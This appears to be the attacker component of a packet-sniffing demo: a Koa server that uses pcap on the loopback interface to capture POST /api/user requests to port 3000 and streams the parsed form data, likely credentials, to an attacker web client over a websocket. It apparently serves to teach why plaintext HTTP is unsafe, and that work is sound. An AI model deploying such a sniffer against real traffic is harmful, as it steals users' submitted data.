import Koa from 'koa';
import serve from 'koa-static';
import websockify from 'koa-websocket';
import Router from 'koa-router';
import pcap from 'pcap';
import querystring from 'querystring';

const app = websockify(new Koa());

const websocketRouter = new Router();
const router = new Router();
const pcap_session = pcap.createSession('lo', 'tcp port 3000 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)');


websocketRouter.all('/websocket', (ctx) => {
  pcap_session.on('packet', function (raw_packet) {
    const packet = pcap.decode.packet(raw_packet);
  
    const requestString = packet.payload.payload.payload.data.toString('utf8');
    if (requestString.includes('POST /api/user HTTP/1.1')) {
      const formData = querystring.parse(requestString.split('\r\n\r\n')[1]);

      console.log('formData', formData)
      ctx.websocket.send(JSON.stringify(formData));
    }
  });
});

app.use(serve('./attacker/client'));
app.use(router.routes()).use(router.allowedMethods());
app.ws.use(websocketRouter.routes()).use(websocketRouter.allowedMethods());


app.listen(3001);
